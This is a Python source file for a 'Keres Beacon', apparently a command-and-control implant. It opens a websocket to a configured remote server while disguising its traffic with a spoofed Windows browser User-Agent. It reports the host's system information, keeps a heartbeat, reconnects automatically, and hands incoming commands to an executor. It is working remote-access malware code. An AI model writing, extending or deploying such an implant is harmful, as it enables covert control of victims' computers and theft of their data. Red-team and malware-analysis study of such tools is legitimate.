import asyncio
import ssl
import json
import signal
import websockets
from typing import NoReturn
from config import settings
from logger import logger
from utils import load_ssl_context, get_system_info
from comms import BeaconComms
from executor import CommandExecutor
from handlers import handle_incoming, send_heartbeat


class KeresBeacon:
    def __init__(self):
        self.executor = CommandExecutor()
        self.ssl_context = self._setup_ssl()
        self.is_running = True

    def _setup_ssl(self) -> ssl.SSLContext:
        if settings.TLS_VERIFY and settings.TLS_CERT_PATH:
            return load_ssl_context(settings.TLS_CERT_PATH, settings.TLS_KEY_PATH)
        return ssl.create_default_context()

    async def run(self) -> NoReturn:
        logger.info(f"[*] Keres Beacon Initialized: {settings.BEACON_ID}")

        while self.is_running:
            try:
                logger.debug(f"[*] Attempting connection to {settings.WS_URL}")

                async with websockets.connect(
                        settings.WS_URL,
                        ssl=self.ssl_context,
                        ping_interval=20,
                        ping_timeout=10,
                        extra_headers={"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"}
                ) as ws:
                    logger.info("[+] Backhaul tunnel established.")
                    comms = BeaconComms(ws)
                    checkin_payload = {
                        "type": "checkin",
                        "beacon_id": settings.BEACON_ID,
                        "data": get_system_info()
                    }
                    await comms.send_json(checkin_payload)
                    done, pending = await asyncio.wait(
                        [
                            asyncio.create_task(send_heartbeat(comms)),
                            asyncio.create_task(handle_incoming(comms, self.executor))
                        ],
                        return_when=asyncio.FIRST_COMPLETED,
                    )
                    for task in pending:
                        task.cancel()

            except (websockets.ConnectionClosed, Exception) as e:
                logger.error(f"[-] Transport Interrupted: {e}")

                if self.is_running:
                    await asyncio.sleep(settings.RECONNECT_DELAY)

    def stop(self, *args) -> None:
        logger.info("[!] Shutdown signal received. Cleaning up...")
        self.is_running = False

async def main():
    beacon = KeresBeacon()
    loop = asyncio.get_running_loop()
    for sig in (signal.SIGINT, signal.SIGTERM):
        try:
            loop.add_signal_handler(sig, beacon.stop)
        except NotImplementedError:
            pass

    await beacon.run()

if __name__ == '__main__':
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        pass
    except Exception as e:
        if getattr(settings, 'DEBUG', False):
            print(f"Fatal Crash: {e}")